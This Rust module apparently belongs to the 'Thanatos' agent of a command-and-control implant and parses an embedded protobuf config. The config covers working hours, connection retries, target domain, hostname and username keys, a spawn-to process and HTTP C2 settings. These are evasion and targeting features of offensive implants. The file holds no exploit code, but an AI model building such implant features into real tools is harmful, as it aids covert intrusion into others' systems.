//! Contains the configuration values for agent

cfg_if::cfg_if! {
    if #[cfg(feature = "full")] {
        mod proto;
        use errors::ThanatosError;
        use utils::uuid::Uuid;

        const CONFIG: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/config.bin"));

        pub struct ConfigVars<'a>(proto::config::Config<'a>);

        impl<'a> ConfigVars<'a> {
            pub fn parse() -> Result<ConfigVars<'a>, ThanatosError> {
                Ok(ConfigVars(quick_protobuf::deserialize_from_slice(CONFIG).map_err(|_| ThanatosError::ConfigParseError)?))
            }

            pub fn uuid(&self) -> Result<Uuid, ThanatosError> {
                Uuid::try_from(self.0.uuid.as_ref()).map_err(|_| ThanatosError::ConfigParseError)
            }

            pub fn working_hours_start(&self) -> u32 {
                self.0.working_hours_start
            }

            pub fn working_hours_end(&self) -> u32 {
                self.0.working_hours_end
            }

            pub fn connection_retries(&self) -> u32 {
                self.0.connection_retries
            }

            pub fn domains(&self) -> Result<Vec<[u8; 32]>, ThanatosError> {
                if self.0.domains.len() % 32 != 0 {
                    return Err(ThanatosError::ConfigParseError);
                }

                self.0.domains.chunks(32).map(|c| {
                    c[..32].try_into().map_err(|_| ThanatosError::ConfigParseError)
                }).collect::<Result<Vec<[u8; 32]>, ThanatosError>>()
            }

            pub fn hostnames(&self) -> Result<Vec<[u8; 32]>, ThanatosError> {
                if self.0.hostnames.len() % 32 != 0 {
                    return Err(ThanatosError::ConfigParseError);
                }

                self.0.hostnames.chunks(32).map(|c| {
                    c[..32].try_into().map_err(|_| ThanatosError::ConfigParseError)
                }).collect::<Result<Vec<[u8; 32]>, ThanatosError>>()
            }

            pub fn usernames(&self) -> Result<Vec<[u8; 32]>, ThanatosError> {
                if self.0.usernames.len() % 32 != 0 {
                    return Err(ThanatosError::ConfigParseError);
                }

                self.0.usernames.chunks(32).map(|c| {
                    c[..32].try_into().map_err(|_| ThanatosError::ConfigParseError)
                }).collect::<Result<Vec<[u8; 32]>, ThanatosError>>()
            }

            pub fn spawn_to(&self) -> &str {
                self.0.spawn_to.as_ref()
            }

            pub fn http(&self) -> Option<&proto::config::HttpConfig> {
                self.0.http.as_ref()
            }
        }
    } else {
        pub mod proto;
    }
}
